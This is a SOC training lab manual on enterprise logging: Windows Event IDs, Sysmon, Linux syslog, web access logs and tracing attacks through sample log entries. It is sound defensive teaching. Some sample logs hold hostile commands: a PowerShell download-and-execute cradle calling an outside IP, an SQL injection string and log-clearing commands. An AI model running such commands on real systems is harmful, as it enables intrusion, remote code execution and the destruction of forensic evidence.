# Lab 01 Part II: Enterprise Logging & Forensic Event Analysis

> **Course:** Cybersecurity Operations (SOC Lab)  
> **Instructor:** Hussein Al-Selwi  
> **Total Slides:** 20 Slides  
> **Source Presentation:** `Lab1_Part2_Logs_Deep_Dive.html`  

### 📋 Overview
Deep-dive manual on enterprise logging: log entry anatomy, raw vs normalized JSON, Windows Security Event IDs (4624, 4625, 4688, 7045, 1102), Sysmon process & network telemetry, Linux syslog, web access logs, and real-world attack log tracing.

---

## 📑 Table of Contents

- [Slide 01: Introduction to Enterprise Logging](#slide-01-introduction-to-enterprise-logging)
- [Slide 02: Module Objectives](#slide-02-module-objectives)
- [Slide 03: What is a Log? The Digital Ground Truth](#slide-03-what-is-a-log-the-digital-ground-truth)
- [Slide 04: Anatomy of a Log Entry: The 5 Forensic Pillars](#slide-04-anatomy-of-a-log-entry-the-5-forensic-pillars)
- [Slide 05: Raw Logs vs Normalized JSON / Key-Value](#slide-05-raw-logs-vs-normalized-json-key-value)
- [Slide 06: Major Log Sources in an Enterprise SOC](#slide-06-major-log-sources-in-an-enterprise-soc)
- [Slide 07: Windows Event Log Architecture (.evtx)](#slide-07-windows-event-log-architecture-evtx)
- [Slide 08: The SOC Analyst's Windows Event ID Cheat Sheet](#slide-08-the-soc-analyst-s-windows-event-id-cheat-sheet)
- [Slide 09: Deep Dive: Event ID 4624 & Logon Types](#slide-09-deep-dive-event-id-4624-logon-types)
- [Slide 10: Deep Dive: Event ID 4625 & Failed Logons](#slide-10-deep-dive-event-id-4625-failed-logons)
- [Slide 11: Deep Dive: Event ID 4688 & Process Auditing](#slide-11-deep-dive-event-id-4688-process-auditing)
- [Slide 12: Why Default Logs Aren't Enough: Introducing Sysmon](#slide-12-why-default-logs-aren-t-enough-introducing-sysmon)
- [Slide 13: The Core Sysmon Event IDs Every Analyst Must Know](#slide-13-the-core-sysmon-event-ids-every-analyst-must-know)
- [Slide 14: Linux Logging & The Syslog Architecture](#slide-14-linux-logging-the-syslog-architecture)
- [Slide 15: Web Application & Perimeter Access Logs](#slide-15-web-application-perimeter-access-logs)
- [Slide 16: Attack Scenario 1 in Logs: Brute-Force to Compromise](#slide-16-attack-scenario-1-in-logs-brute-force-to-compromise)
- [Slide 17: Attack Scenario 2 in Logs: Service-Based Persistence](#slide-17-attack-scenario-2-in-logs-service-based-persistence)
- [Slide 18: Attack Scenario 3 in Logs: Anti-Forensic Log Wiping](#slide-18-attack-scenario-3-in-logs-anti-forensic-log-wiping)
- [Slide 19: Enterprise Log Management Best Practices](#slide-19-enterprise-log-management-best-practices)
- [Slide 20: Module Summary & Key Takeaways](#slide-20-module-summary-key-takeaways)

---

## Slide 01: Introduction to Enterprise Logging

> **Category:** `SOC TELEMETRY & AUDIT TRAILS`

### Enterprise Logging & Forensic Event Analysis

The foundational guide to log anatomy, Windows Event IDs, Sysmon telemetry, and identifying attack patterns in raw data.

Lab 1 — Part II: SOC Telemetry Deep Dive Instructor: Hussein Al-Selwi

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Welcome students to Part II of Lab 1. Emphasize that logs are the lifeblood and primary currency of any Security Operations Center. A SOC analyst spends 80% of their working day reading, querying, correlating, and interpreting logs. This session turns abstract concepts into real technical forensic analysis.

---

## Slide 02: Module Objectives

> **Category:** `LEARNING OBJECTIVES`

### What You Will Master in This Lab

By the end of this module, every analyst will possess the core competencies needed to read and triage enterprise logs:

- **1. Log Anatomy & Structure**: Deconstruct any raw log entry into its 5 forensic pillars: Timestamp (UTC), Source, Event ID, User Identity, and Payload.
- **2. Critical Windows Event IDs**: Memorize and analyze the essential Security Event IDs (4624, 4625, 4688, 7045, 1102) and their forensic significance.
- **3. Sysmon Advanced Telemetry**: Understand why default OS logging is insufficient and how Sysmon provides process hashes and network socket tracking.
- **4. Attack Signatures in Logs**: Identify real attack scenarios in raw data: Credential Brute-Forcing, Service-Based Persistence, and Anti-Forensic Log Wiping.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Walk through each objective so students understand the practical expectations: knowing what a log contains, memorizing critical Windows Event IDs, understanding why Sysmon is vital, and tracing attack patterns in log files.

---

## Slide 03: What is a Log? The Digital Ground Truth

> **Category:** `CORE DEFINITIONS`

### What is a Security Log?

A Log is an automatically generated, timestamped record of an event, action, or transaction that occurred within an operating system, application, or network device.

> [!NOTE]
> 💡 The Golden Rule of Incident Response "In cybersecurity, if an event was not logged, for all forensic and legal purposes, it never happened — and conversely, if an attacker acted on an endpoint, they left a digital trace in the logs."

- **1. Unalterable Witness**: Records what code executed, who authenticated, what connection opened, and what file was modified.
- **2. Timeline Reconstruction**: Allows investigators to recreate the exact step-by-step chronology of an attack from patient zero to data theft.
- **3. Compliance & Proof**: Mandated by global security frameworks (ISO 27001, PCI-DSS, NIST) for accountability and incident reporting.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Define a log clearly: it is an immutable audit record generated automatically by software. If an action occurred on a computer system, a log must exist. Attackers cannot hide unless they disable logging or wipe logs, which itself generates an event.

---

## Slide 04: Anatomy of a Log Entry: The 5 Forensic Pillars

> **Category:** `LOG STRUCTURE`

### The 5 Forensic Pillars of a Log Entry

Whenever an analyst inspects any log in a SIEM, they immediately deconstruct it into five fundamental questions:

- **1. When? — Timestamp (UTC)**: Exact date, time, and millisecond of occurrence. Must be synchronized across all systems via NTP in UTC.
- **2. Where? — Source & Destination**: The hostname, source IP address and port, and the destination IP and port involved in the transaction.
- **3. What? — Event ID & Action**: The standardized event identifier and action: Success, Failure, Process Create, Allowed, Denied, or Dropped.
- **4. Who? — User & Identity Context**: The account name, Security Identifier (SID), Logon ID, process owner, or service account that initiated the activity.

> [!NOTE]
> 5. Details & Payload (The 'How') Contextual data: full command line arguments, process parent/child PIDs, file hashes (SHA-256), registry keys modified, or HTTP request URLs.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Every log entry, regardless of format, answers the 5 fundamental W's: When (Timestamp), Where (Source/Host), What (Event ID/Action), Who (User/Account), and How/Details (Message/Payload). Teach students to look for these 5 fields immediately when inspecting any alert.

---

## Slide 05: Raw Logs vs Normalized JSON / Key-Value

> **Category:** `DATA TRANSFORMATION`

### From Raw Text to Searchable Structured Intelligence

Security devices output raw logs in hundreds of different formats. A modern SIEM parses and normalizes them into standard schemas:

#### Raw Syslog / Web Log (Unstructured Text)

```bash
192.168.1.105 - admin [21/Oct/2026:02:15:33 +0000] "GET /login.php?user=admin' OR '1'='1 HTTP/1.1" 200 4522 "https://corp.local/" "Mozilla/5.0"
```

#### Parsed & Normalized Log (SIEM Key-Value / JSON)

```json
{
 "timestamp": "2026-10-21T02:15:33.000Z",
 "src_ip": "192.168.1.105",
 "user": "admin",
 "http_method": "GET",
 "url_path": "/login.php",
 "query_string": "user=admin' OR '1'='1",
 "http_status": 200,
 "threat_category": "SQL_INJECTION_ATTEMPT"
}
```

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Show the difference between a raw unstructured text line (which is hard to query across thousands of events) and a normalized JSON entry parsed by a SIEM. Normalization maps different field names from 20 vendors into standard fields like src_ip and user.

---

## Slide 06: Major Log Sources in an Enterprise SOC

> **Category:** `ENTERPRISE TELEMETRY`

### Where Do Enterprise Logs Originate?

A resilient SOC ingests telemetry across all layers of the IT enterprise to eliminate blind spots:

- **1. Endpoint & Host Logs**: Windows Event Logs, Linux Syslog, macOS unified logs, EDR sensor telemetry, and Sysmon process tracking.
- **2. Identity & Directory Logs**: Active Directory domain controller events, Kerberos authentications, Azure AD / Okta SSO, and MFA failure logs.
- **3. Perimeter & Network Logs**: Next-Gen Firewall allow/deny events, VPN connection logs, DNS resolver query logs, and Proxy web filters.
- **4. Web & Application Logs**: Apache, Nginx, IIS access and error logs, database transaction logs (SQL Server, Oracle, PostgreSQL).
- **5. Security Tool Alerts**: Antivirus detections, IDS/IPS alerts (Snort/Suricata), Email gateway spam/phishing verdicts.
- **6. Cloud & Infrastructure**: AWS CloudTrail, Microsoft Azure Activity Logs, Google Cloud Audit logs, and Kubernetes control plane logs.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Provide a comprehensive taxonomy of enterprise log sources. A SOC does not look at only one device; they ingest from endpoints, active directory, firewalls, DNS, web applications, and cloud.

---

## Slide 07: Windows Event Log Architecture (.evtx)

> **Category:** `WINDOWS INTERNALS`

### Windows Event Logging Architecture

Windows stores structured XML-based event logs in proprietary binary files with the .evtx extension located in C:\Windows\System32\winevt\Logs\ :

- **Security.evtx**: The Core SOC Log. Contains logon/logoff events, privilege use, user management, and process creation. Restricted to Administrator access only.
- **System.evtx**: Records operating system component activity: driver loading, service starts/stops, system errors, and hardware changes.
- **Application.evtx**: Events logged by installed software, databases, or local third-party applications (e.g., SQL server errors, browser crashes).

> [!NOTE]
> 🔍 Modern Analytical & Operational Channels Beyond the classic three, Windows includes specialized channels for incident response: Microsoft-Windows-Sysmon/Operational , Microsoft-Windows-PowerShell/Operational , and Microsoft-Windows-TaskScheduler/Operational .

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Explain how Windows structures its logs into channels and proprietary .evtx files in System32\winevt\Logs. Focus on the core distinction between Security, System, and Application logs, and how the Event Viewer GUI reads them.

---

## Slide 08: The SOC Analyst's Windows Event ID Cheat Sheet

> **Category:** `CRITICAL EVENT IDS`

### Essential Windows Security Event IDs

Every defensive analyst must memorize these primary Event IDs — they represent the foundation of all detection rules:

| Event ID | Event Name / Description | Forensic Significance in a SOC |
| --- | --- | --- |
| 4624 | Successful Account Logon | Verify authentication source, username, and Logon Type (Local vs Network vs RDP). |
| 4625 | Failed Account Logon | Detect Password Spraying, Brute-Force attacks, and unauthorized access attempts. |
| 4672 | Special Privileges Assigned | Detect Administrator / Superuser logons and privilege escalation events. |
| 4688 | A New Process Has Been Created | Track what executables spawned, parent processes, and command line arguments. |
| 7045 | A New Service Was Installed | Detect adversary persistence and lateral movement tools (e.g., PsExec, malware services). |
| 4720 | A User Account Was Created | Catch backdoor account creation by malicious actors or unauthorized admins. |
| 1102 | The Audit Log Was Cleared | Critical red flag! Indicates an attacker attempting to cover their tracks. |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Walk through the master cheat sheet table. Every SOC analyst interview asks about 4624, 4625, 4688, 7045, and 1102. Emphasize that memorizing these numbers is non-negotiable for anyone working in cyber defense.

---

## Slide 09: Deep Dive: Event ID 4624 & Logon Types

> **Category:** `AUTHENTICATION ANALYSIS`

### Deconstructing Event ID 4624: The Logon Type Key

When an account authenticates successfully, Windows logs Event ID 4624. The single most important field for triage is the Logon Type :

- **Logon Type 2: Interactive**: Physical Console Logon. The user sat physically in front of the machine and entered credentials on the local keyboard.
- **Logon Type 3: Network**: Network Connection. Connection to shared folders (SMB/CIFS), network printers, or IIS web applications from another host.
- **Logon Type 10: RemoteInteractive**: Remote Desktop (RDP). The user connected via Remote Desktop Services from a remote IP address across the network or WAN.

- **Logon Type 4: Batch**: Scheduled tasks running in the background under a designated service account.
- **Logon Type 5: Service**: A Windows background service starting up under its service account credentials.
- **Logon Type 9: NewCredentials**: Used by runas /netonly — heavily abused by lateral movement tools like Mimikatz.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Explain that Event ID 4624 is meaningless without knowing the Logon Type. Logon Type 2 means physical keyboard access, Type 3 is network access like SMB share, Type 10 is Remote Desktop (RDP). If an accounting clerk logs in with Type 10 at 3 AM from an external IP, that's an immediate incident.

---

## Slide 10: Deep Dive: Event ID 4625 & Failed Logons

> **Category:** `AUTHENTICATION ANALYSIS`

### Detecting Brute Force Attacks: Event ID 4625

Logged whenever an authentication attempt fails. In a SOC, a burst of 4625 events indicates an active attack:

| Substatus Code | Hex Error | Forensic Explanation & Attack Implication |
| --- | --- | --- |
| STATUS_WRONG_PASSWORD | 0xC000006A | The username exists and is valid, but the password provided was incorrect. Indicates targeted credential guessing. |
| STATUS_NO_SUCH_USER | 0xC0000064 | The specified username does not exist. High volumes indicate username enumeration / dictionary attacks. |
| STATUS_ACCOUNT_LOCKED_OUT | 0xC0000234 | Account threshold exceeded. The attacker triggered the lockout policy after repeated failures. |
| STATUS_PASSWORD_EXPIRED | 0xC0000071 | Legitimate user whose password expired, or stale service account credentials. |

> [!WARNING]
> 🚨 SOC Triage Metric: Brute Force vs Password Spraying Brute Force: 500 failed logons against 1 single account from 1 IP. Password Spraying: 1 failed logon against 500 different accounts within 5 minutes using the same password (e.g. Spring2026! ) to avoid lockout.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Event ID 4625 is the primary detector for brute force and password spraying. Explain the Status and Substatus error codes: 0xC000006A means the username was valid but the password was wrong. 0xC0000064 means the username does not exist at all (account enumeration). 0xC0000234 means the account got locked out.

---

## Slide 11: Deep Dive: Event ID 4688 & Process Auditing

> **Category:** `PROCESS VISIBILITY`

### Process Execution Visibility: Event ID 4688

Logs every executable program spawned on the operating system. Crucial for tracing malware execution trees:

- **Parent Process (Creator)**: Field: CreatorProcessName & ProcessId Who launched the program? (e.g. C:\Windows\explorer.exe or suspicious parent like WINWORD.EXE ).
- **Child Process (New Executable)**: Field: NewProcessName & NewProcessId What was launched? (e.g. C:\Windows\System32\cmd.exe or an unsigned binary in %APPDATA% ).

> [!NOTE]
> ⚠️ The Critical SOC Configuration: Command-Line Auditing By default, Windows records the program path, but hides the command arguments . Security teams must enable Group Policy: Computer Configuration -> Admin Templates -> System -> Audit Process Creation -> "Include command line in process creation events" . Without this, you see powershell.exe started, but miss the payload: powershell.exe -enc JABzAD0ATgBlAHcALQ... !

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Explain that Event ID 4688 logs whenever any executable starts. By default, Windows does NOT include the full command-line arguments unless an explicit Group Policy is enabled: Include command line in process creation events. Without command-line auditing, you see powershell.exe ran, but you cannot see the encoded malicious script it executed!

---

## Slide 12: Why Default Logs Aren't Enough: Introducing Sysmon

> **Category:** `ADVANCED ENDPOINT TELEMETRY`

### Why Default Windows Logs Leave Critical Blind Spots

Native Windows Security auditing was designed for compliance, not modern threat hunting. Attackers easily bypass it:

- **Blind Spot 1: No File Hashes**: Windows Event 4688 logs the process name, but not its cryptographic hash (MD5, SHA256). If an attacker names their malware svchost.exe , you cannot distinguish it from the real OS binary!
- **Blind Spot 2: No Process-to-Network Binding**: Windows firewall logs show an outbound IP connection, but cannot tell you which specific Process ID or executable made that network request!
- **Blind Spot 3: No Memory Injection Visibility**: Default logs cannot detect code injection into legitimate processes (Process Hollowing, DLL Injection, Remote Thread Creation).

> [!NOTE]
> 🛡️ The Solution: Microsoft Sysmon (System Monitor) A free, lightweight Windows system service and device driver from Microsoft Sysinternals that remains resident across reboots to monitor and log advanced system activity directly into its own Windows Event Log channel: Microsoft-Windows-Sysmon/Operational .

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Explain why modern SOCs install Microsoft Sysmon (System Monitor) from Sysinternals. Native Windows Security logs lack process hashes (MD5, SHA256), lack network socket-to-process binding, and miss advanced DLL injection techniques. Sysmon bridges this gap completely for free.

---

## Slide 13: The Core Sysmon Event IDs Every Analyst Must Know

> **Category:** `SYSMON TELEMETRY`

### Essential Sysmon Event IDs for Threat Hunting

Sysmon events provide the deepest endpoint visibility available without a commercial EDR agent:

- **Event ID 1: Process Creation**: Extends native 4688 with: Hashes (MD5, SHA256), ParentCommandLine , CurrentDirectory , and full parent-child execution lineage.
- **Event ID 3: Network Connection**: Records both TCP/UDP outbound and inbound connections, binding the remote IP/Port directly to the exact Image (executable) and ProcessGuid that initiated it!
- **Event ID 11: FileCreate**: Logs when a file is created or written to disk. Essential for catching malware dropping secondary payloads, ransomware staging, or webshell creation.
- **Event ID 7: Image Loaded**: Logs when a DLL is loaded into a process. Crucial for detecting DLL Hijacking and DLL Side-Loading attacks.
- **Event ID 12/13: Registry Event**: Detects creation, deletion, or modification of sensitive registry persistence keys (e.g., Run keys, SafeBoot values).
- **Event ID 8: CreateRemoteThread**: Detects a process injecting code into another separate process — the hallmark signature of Process Injection & Hollowing!

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Walk through the primary Sysmon events: Event ID 1 (Process Create with hashes and full parent lineage), Event ID 3 (Network Connection with source/destination IP, port, and the EXACT executable image responsible), Event ID 11 (File creation in sensitive directories).

---

## Slide 14: Linux Logging & The Syslog Architecture

> **Category:** `LINUX TELEMETRY`

### Linux Logging Architecture & Key Log Files

Linux and UNIX systems leverage the Syslog protocol (RFC 5424) and systemd journal to manage system telemetry:

- **/var/log/auth.log**: (or /var/log/secure on RHEL/CentOS) . Authentication events, SSH logins, sudo command executions, and PAM module failures.
- **/var/log/syslog**: (or /var/log/messages ) . General operational messages from system services, kernel drivers, and background daemons.
- **journalctl (systemd)**: Binary structured log database for modern Linux distributions. Queryable via: journalctl -u ssh.service -n 50

#### Sample Failed SSH Login in /var/log/auth.log

```bash
Oct 21 03:12:44 ubuntu-srv sshd[14205]: Failed password for invalid user root from 203.0.113.45 port 54812 ssh2
Oct 21 03:12:46 ubuntu-srv sshd[14208]: Failed password for invalid user admin from 203.0.113.45 port 54816 ssh2
Oct 21 03:12:48 ubuntu-srv sshd[14212]: Failed password for invalid user oracle from 203.0.113.45 port 54820 ssh2
```

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Cover Linux logging via the standard Syslog daemon and systemd journalctl. Highlight /var/log/auth.log (or secure in RedHat) for failed SSH and sudo commands, and how remote syslog forwards logs over UDP/TCP 514 to the SIEM.

---

## Slide 15: Web Application & Perimeter Access Logs

> **Category:** `APPLICATION SECURITY`

### Dissecting Web Server Access Logs (Combined Log Format)

Web servers generate access logs documenting every HTTP/HTTPS request sent to your organization's web applications:

```bash
198.51.100.24
-
john.doe
[
21/Oct/2026:04:18:02 +0000
] "
POST
/api/v1/transfer
HTTP/1.1
"
403
182 "
https://corp.local/dashboard
" "
Mozilla/5.0 (Windows NT 10.0; Win64; x64)
"
```

| Field Name | Sample Value | What It Tells the SOC Analyst |
| --- | --- | --- |
| Client IP (Source) | 198.51.100.24 | Who sent the request? Check reputation against AbuseIPDB or VirusTotal. |
| HTTP Method & URI | POST /api/v1/transfer | What endpoint was targeted? Look for path traversal ( ../ ) or SQL syntax. |
| HTTP Status Code | 403 (Forbidden) | Did the attack succeed? 200 (Success), 403 (Blocked/Forbidden), 500 (Server Error/Crash). |
| User-Agent | Mozilla/5.0... | Identifies client browser, tool, or scanner (e.g. sqlmap , nikto , python-requests ). |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Explain how web servers (Apache, Nginx, IIS) format their access logs using the Common / Combined Log Format. Show students how to immediately spot web attacks by looking at the URI query parameters and HTTP status codes.

---

## Slide 16: Attack Scenario 1 in Logs: Brute-Force to Compromise

> **Category:** `REAL-WORLD ATTACK TRACING`

### Detecting the Attack Chain: Brute-Force & Breach

In a real SOC, an attack does not arrive as a neat alert — it unfolds across a chronological sequence of events:

1. **Burst of Event 4625**: Failed Logons. 250 failed authentications targeting account svc_backup within 90 seconds. Error: 0xC000006A .
2. **Single Event 4624**: Logon Success! At 02:14:11, authentication succeeds! LogonType=3 originating from IP 10.0.4.88 .
3. **Immediate Event 4672**: Privilege Escalation. SeDebugPrivilege and SeTcbPrivilege assigned to the newly logged-in session.
4. **Event 4688 / Sysmon 1**: Malicious Spawning. The session executes whoami /priv followed by net user /add backdoor user.

> [!NOTE]
> 🧠 The SIEM Correlation Rule Logic IF count(EventID=4625) > 20 FROM same(SrcIP) WITHIN 2 min FOLLOWED BY EventID=4624 WITH same(TargetUser) THEN TRIGGER "CRITICAL: Successful Brute-Force Attack Detected"

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Walk through an actual multi-stage attack as seen in log events. Point out the exact sequence: many failed logons (4625), followed by one success (4624), followed by immediate privilege assignment (4672). This 3-step sequence is one of the most common SIEM correlation rules.

---

## Slide 17: Attack Scenario 2 in Logs: Service-Based Persistence

> **Category:** `REAL-WORLD ATTACK TRACING`

### Detecting Malware Persistence: Event ID 7045

Attackers create Windows Services to ensure their backdoor starts automatically on every system boot:

```powershell
Log Name: System
Source: Service Control Manager
Event ID: 7045
Level: Information
User: SYSTEM
Description:
A service was installed in the system.
Service Name: WindowsDefenderUpdateHelper
Service File Name: powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.99/payload.ps1')"
Service Type: user mode service
Service Start Type: auto start
Service Account: LocalSystem
```

> [!NOTE]
> 🔍 3 Immediate Red Flags in This Single Log Entry 1. Masquerading Name: Poses as "WindowsDefenderUpdateHelper" to trick casual administrators. 2. Suspicious Binary: Service File Name launches powershell.exe with hidden flags instead of a compiled .exe service. 3. Remote Cradle: Downloads and executes a live unverified script directly from an external untrusted IP!

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Walk through Event 7045. Adversaries commonly install a service to survive system reboots (MITRE ATT&CK T1543.003). Show how the ImagePath field reveals the malicious payload (e.g. powershell beaconing to C2).

---

## Slide 18: Attack Scenario 3 in Logs: Anti-Forensic Log Wiping

> **Category:** `DEFENSE EVASION`

### Catching Anti-Forensics: Event ID 1102 & 104

When sophisticated attackers compromise an endpoint, they often attempt to erase the audit trail to prevent investigation:

- **Security Log Cleared: Event ID 1102**: Logged in Security.evtx whenever an administrator or attacker clears the security log via Event Viewer or command: wevtutil cl Security or Clear-EventLog .
- **System Log Cleared: Event ID 104**: Logged in System.evtx whenever the System or Application log channels are cleared by a user or script.

```yaml
Log Name: Security
Source: Microsoft-Windows-Eventlog
Event ID: 1102
User: CORP\compromised_admin
Description:
The audit log was cleared.
Subject:
 Security ID: S-1-5-21-392817291-1029381-1001
 Account Name: compromised_admin
 Domain: CORP
 Logon ID: 0x14F92B
```

> [!NOTE]
> 🚨 The Irony of Log Clearing An attacker can erase previous events, but Windows automatically records who erased them in Event 1102! In a mature SOC, Event 1102 triggers an immediate Tier-3 Incident Response engagement.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Explain Event ID 1102 (Security audit log cleared) and Event ID 104 in System log. When sophisticated adversaries finish their operation or feel detected, they run 'wevtutil cl Security' to wipe their footprints. But the act of clearing the log generates this special un-wipeable event!

---

## Slide 19: Enterprise Log Management Best Practices

> **Category:** `SOC ENGINEERING`

### Best Practices for Enterprise Log Integrity

A SOC is only as reliable as the integrity of the data it ingests. Three architectural mandates must be enforced:

- **1. Real-Time Forwarding**: Never leave logs exclusively on the local endpoint! Forward telemetry within seconds to the central SIEM. If an attacker wipes the laptop, the SIEM still holds the complete record.
- **2. Clock Synchronization**: Enforce strict NTP (Network Time Protocol) synchronization across all domains in UTC. Clock drift of even 10 seconds destroys correlation rules and timeline evidence!
- **3. WORM Storage & RBAC**: Store archived logs in Write-Once-Read-Many (WORM) storage. Restrict SIEM access so even Domain Admins cannot delete log archives without multi-party approval.

> [!NOTE]
> 📋 Retention Guidelines (NIST SP 800-92) Keep active searchable logs in the SIEM for at least 90 days (hot storage), and archived compressed logs for at least 365 days (1 year) in cold storage for advanced threat investigations.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Cover the three core principles of enterprise log management: real-time centralized forwarding (so local log wiping is useless), time synchronization via NTP, and tamper-resistant storage policies.

---

## Slide 20: Module Summary & Key Takeaways

> **Category:** `REVIEW & TAKEAWAYS`

### Summary: The Analyst's Logging Playbook

You have now mastered the essential logging foundation of enterprise defensive operations:

- **1. Ground Truth**: Logs provide the definitive record of what occurred. Never trust verbal claims or superficial indicators — always verify the raw log.
- **2. Windows Event IDs**: 4624 (Logon Type is key), 4625 (watch the substatus code), 4688 (command line auditing), 7045 (persistence), 1102 (log wiped).
- **3. Advanced Telemetry**: Sysmon fills OS blind spots by recording process hashes (ID 1), network socket attribution (ID 3), and file creations (ID 11).
- **4. Next Step: Lab Setup**: In Lab 2, we will configure your laptops with Wireshark, Sysinternals, and our student SIEM to ingest and analyze real attack logs hands-on!

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Summarize the key takeaways. Reiterate that logs are the foundational data layer. Next week in Lab 2, students will set up their own personal SOC lab environment to start ingesting and analyzing these exact logs hands-on.

---

## 🎯 Summary & Key Takeaways

- **Module:** Lab 01 Part II: Enterprise Logging & Forensic Event Analysis

- **Core Competencies Developed:** Telemetry ingestion, forensic event analysis, and defensive toolchain deployment.

- **Course Reference:** Cybersecurity Operations Practical Labs by **Hussein Al-Selwi**.
